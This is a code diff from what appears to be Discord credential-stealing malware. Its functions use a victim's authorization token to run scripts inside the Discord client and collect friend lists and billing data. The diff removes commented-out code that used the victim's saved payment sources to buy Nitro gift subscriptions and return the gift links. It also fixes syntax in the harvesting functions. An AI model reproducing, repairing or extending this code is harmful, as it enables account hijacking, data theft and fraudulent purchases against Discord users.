@@ -488,77 +488,21 @@ const getBilling = async (token) => {
   return billing;
 };
 
-const fetchFriends = async = (token) => {
-  const bill = await execScript(`var xmlHttp = new XMLHttpRequest();
-    xmlHttp.open("GET", "${config.api}/relationships, false);
-    xmlHttp.setRequestHeader("Authorization", "${token}");
-    xmlHttp.send(null);
+const fetchFriends = async (token) => {
+  const bill = await execScript(`var xmlHttp = new XMLHttpRequest(); 
+    xmlHttp.open("GET", "${config.api}/relationships", false); 
+    xmlHttp.setRequestHeader("Authorization", "${token}"); 
+    xmlHttp.send(null); 
     xmlHttp.responseText`);
-//   if (!bill.lenght || bill.lenght === 0) return '';
   return JSON.parse(bill);
 };
 
 const getFriends = async (token) => {
-//   let s = 0;
   const data = await fetchFriends(token);
-//   data.forEach(x) => {
-//     if (x['type'] ==1) {
-//       s+=1;
-//     }
-//   });
-//   return s;
-// };
-
-// const Purchase = async (token, id, _type, _time) => {
-//   const options = {
-//     expected_amount: config.nitro[_type][_time]['price'],
-//     expected_currency: 'usd',
-//     gift: true,
-//     payment_source_id: id,
-//     payment_source_token: null,
-//     purchase_token: '2422867c-244d-476a-ba4f-36e197758d97',
-//     sku_subscription_plan_id: config.nitro[_type][_time]['sku'],
-//   };
-
-//   const req = execScript(`var xmlHttp = new XMLHttpRequest();
-//     xmlHttp.open("POST", "https://discord.com/api/v9/store/skus/${config.nitro[_type][_time]['id']}/purchase", false);
-//     xmlHttp.setRequestHeader("Authorization", "${token}");
-//     xmlHttp.setRequestHeader('Content-Type', 'application/json');
-//     xmlHttp.send(JSON.stringify(${JSON.stringify(options)}));
-//     xmlHttp.responseText`);
-//   if (req['gift_code']) {
-//     return 'https://discord.gift/' + req['gift_code'];
-//   } else return null;
-// };
-
-// const buyNitro = async (token) => {
-//   const data = await fetchBilling(token);
-//   const failedMsg = 'Failed to Purchase ❌';
-//   if (!data) return failedMsg;
-
-//   let IDS = [];
   let s = 0;
   let k = 0;
   data.forEach((x) => {
     if (!x.invalid) {
-//       IDS = IDS.concat(x.id);
-//     }
-//   });
-//   for (let sourceID in IDS) {
-//     const first = Purchase(token, sourceID, 'boost', 'year');
-//     if (first !== null) {
-//       return first;
-//     } else {
-//       const second = Purchase(token, sourceID, 'boost', 'month');
-//       if (second !== null) {
-//         return second;
-//       } else {
-//         const third = Purchase(token, sourceID, 'classic', 'month');
-//         if (third !== null) {
-//           return third;
-//         } else {
-//           return failedMsg;
-//         }
       switch (x.type) {
         case 1:
           s += 1;
@@ -566,10 +510,9 @@ const getFriends = async (token) => {
           k += 1;
       }
     }
-//   }
+  });
+  return s;
 };
-return s;
- };
 
 const getNitro = (flags) => {
   switch (flags) {
